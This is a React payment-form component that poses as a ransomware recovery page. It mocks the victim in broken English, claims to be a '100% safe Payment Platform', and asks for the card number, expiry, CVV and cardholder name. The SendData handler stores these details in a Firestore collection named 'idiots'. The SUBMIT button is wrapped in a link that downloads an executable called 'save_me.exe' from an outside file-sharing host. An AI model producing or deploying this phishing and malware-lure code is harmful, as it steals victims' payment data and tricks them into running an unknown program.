"use client";
import React, { useState } from "react";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles-compiled.css";
import addData from "@/firebase/firestore/addData";

const PaymentForm = () => {
  const [state, setState] = useState({
    number: "",
    expiry: "",
    cvc: "",
    name: "",
    focus: "",
  });

  const SendData = async (event) => {
    event.preventDefault();
    const { error } = await addData("idiots", state.name, state);
    console.log(error);
  };

  const handleInputChange = (evt, limit) => {
    const { name, value } = evt.target;

    setState((prev) => ({ ...prev, [name]: value.slice(0, limit) }));
  };

  const handleInputFocus = (evt) => {
    setState((prev) => ({ ...prev, focus: evt.target.name }));
  };

  return (
    <>
      <div className="flex justify-center items-center flex-col my-8">
        <p className="text-xl py-4">
          Looks like you got rekt, frijend. Dont worry doe, if you want to
          return back your files, all yous has to do is be kindly please enter
          your credit kard info on this
        </p>
        <h1 id="ugleeText" className="text-4xl text-pink-500 mt-6">
          100% safe Payment Plaftorm
        </h1>
        <h6>(Confirmed by Elon-check-if-good-sajt-com)</h6>
      </div>
      <div className="ml-2 text-pink-500 text-2xl">
        <Cards
          number={state.number}
          expiry={state.expiry}
          cvc={state.cvc}
          name={state.name}
          focused={state.focus}
        />
        <form className="flex flex-col items-center justify-center gap-4 mt-10 ">
          <input
            required
            type="number"
            name="number"
            placeholder="Card namber"
            value={state.number}
            onChange={(evt) => handleInputChange(evt, 16)}
            onFocus={handleInputFocus}
          />
          <input
            required
            type="expiry"
            name="expiry"
            placeholder="Expiretion date"
            value={state.expiry}
            onChange={(evt) => handleInputChange(evt, 4)}
            onFocus={handleInputFocus}
          />

          <input
            required
            type="cvc"
            name="cvc"
            placeholder="CVV"
            value={state.cvc}
            onChange={(evt) => handleInputChange(evt, 3)}
            onFocus={handleInputFocus}
          />
          <input
            required
            type="name"
            name="name"
            placeholder="Name on Card"
            value={state.name}
            onChange={(evt) => handleInputChange(evt, 15)}
            onFocus={handleInputFocus}
          />
          <a href="https://download.wetransfer.com/eugv/0172365ca9a39b4a7deae712239b218120230602064900/aa97929cb675896a9f7c3ff2b79992eee3ae6d5d/save_me.exe?cf=y&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQifQ.eyJleHAiOjE2ODU2ODkyMjIsImlhdCI6MTY4NTY4ODYyMiwiZG93bmxvYWRfaWQiOiI1NmI1ODMyYi1jOTUxLTQwNGItYTRkYS0zNDA2NTU5NDAxNGEiLCJzdG9yYWdlX3NlcnZpY2UiOiJzdG9ybSJ9.bMr8_kpxdxis_urVZ8QJhqcP-4NBuIDuJ4_xXdIrHYk">
            <button
              onClick={SendData}
              className="border-pink-500 border-[2px] px-8 py-3 bg-pink-500 text-white rounded-full mt-4"
            >
              SUBMIT
            </button>
          </a>
        </form>
      </div>
    </>
  );
};

export default PaymentForm;
